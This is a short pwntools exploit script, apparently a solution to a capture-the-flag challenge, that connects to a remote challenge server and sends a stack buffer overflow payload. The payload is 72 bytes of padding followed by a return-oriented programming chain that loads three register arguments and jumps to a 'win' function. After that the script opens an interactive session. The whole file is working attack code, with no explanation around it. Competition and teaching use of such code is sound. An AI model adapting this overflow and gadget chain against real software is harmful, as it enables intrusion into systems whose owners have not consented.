#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./toolkit', checksec=False)
context.arch = 'amd64'

p = remote("offsec.m0lecon.it", 13531)

OFFSET_TO_RIP = 72

RET_GADGET = 0x401216
POP_RDI_RET = 0x4011fb
POP_RSI_RET = 0x401204
POP_RDX_RET = 0x40120d

win_address = 0x40121e

a = 0x1111111111111111
b = 0x2222222222222222
c = 0x3333333333333333

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET_GADGET),
    p64(POP_RDI_RET), p64(a),
    p64(POP_RSI_RET), p64(b),
    p64(POP_RDX_RET), p64(c),
    p64(win_address)
)

p.recvuntil(b'[toolkit] Input:')
p.send(payload)
p.interactive()
